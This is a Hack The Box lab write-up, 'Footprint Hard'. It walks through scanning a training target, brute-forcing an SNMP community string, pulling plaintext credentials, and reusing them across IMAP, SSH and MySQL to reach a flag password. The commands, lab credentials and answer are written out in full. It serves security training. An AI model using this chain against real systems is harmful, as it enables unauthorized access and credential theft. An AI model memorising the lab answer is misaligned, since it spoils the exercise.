### Footprint Hard Lab Exercise
 
IP: 10.129.202.20
 
---
 
### Question 1:
Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
 
I start off with an nmap scan against TCP to get a look at the ports.
 
```diff
+ $ nmap -sV -A -sC -Pn -n 10.129.202.20
```
 
	PORT    STATE SERVICE  VERSION
	22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	110/tcp open  pop3     Dovecot pop3d
	143/tcp open  imap     Dovecot imapd (Ubuntu)
	993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
	995/tcp open  ssl/pop3 Dovecot pop3d
 
Nothing that can be accessed without credentials, so I take a look at UDP.
 
```diff
+ $ sudo nmap -sU -A -Pn -n 10.129.202.20
```
 
	68/udp  open|filtered dhcpc
	161/udp open          snmp    net-snmp; net-snmp SNMPv3 server
 
From this I can see that SNMP is being used. I think to use a community string brute force, using onesixtyone.
 
```diff
+ $ onesixtyone -c ~/Downloads/snmp.txt 10.129.202.20
```
 
	Scanning 1 hosts, 3219 communities
	10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
 
Having found the community string, I pass it against snmpbulkwalk.
 
```diff
+ $ snmpbulkwalk -v2c -c backup 10.129.202.20 -m all | tee snmp.out
```
 
Combing the output, I notice a string containing credentials.
 
	iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
 
I use the credentials against IMAP and get access.
 
```diff
+ $ openssl s_client -connect 10.129.202.20:imaps
+ 1 LOGIN tom NMds732Js2761
```
 
	1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
 
Listing the directories and checking for mail, one directory, inbox, contains a message.
 
```diff
+ 2 SELECT INBOX
+ 3 FETCH 1 BODY[TEXT]
```
 
	HELO dev.inlanefreight.htb
	MAIL FROM:<tech@dev.inlanefreight.htb>
	RCPT TO:<bob@inlanefreight.htb>
	DATA
	From: [Admin] <tech@inlanefreight.htb>
	To: <tom@inlanefreight.htb>
	Date: Wed, 10 Nov 2010 14:21:26 +0200
	Subject: KEY
 
The body includes an SSH key. I copy that onto my machine, `chmod` it, and pass it to an ssh command to SSH into the tom user.
 
```diff
+ $ chmod 600 id_rsa
+ $ ssh -i id_rsa tom@10.129.202.20
```
 
	tom@NIXHARD:~$
 
I look at their bash_history and see that a recent command was a mysql login, where they accessed their user. I try to login with their user and password, which works.
 
```diff
+ tom@NIXHARD:~$ mysql -u tom -p
```
 
	mysql>
 
I then browse databases, seeing that one is named users.
 
```diff
+ mysql> show databases;
+ mysql> use users;
+ mysql> show tables;
```
 
Inside is a users table, and I form a query.
 
```diff
+ mysql> select * from users where username = "HTB";
```
 
	+------+----------+------------------------------+
	| id   | username | password                     |
	+------+----------+------------------------------+
	|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
	+------+----------+------------------------------+
 
From this, I have found the HTB user's password.
 
&#x1F6A9; found **cr3n4o7rzse7rzhnckhssncif7ds**.

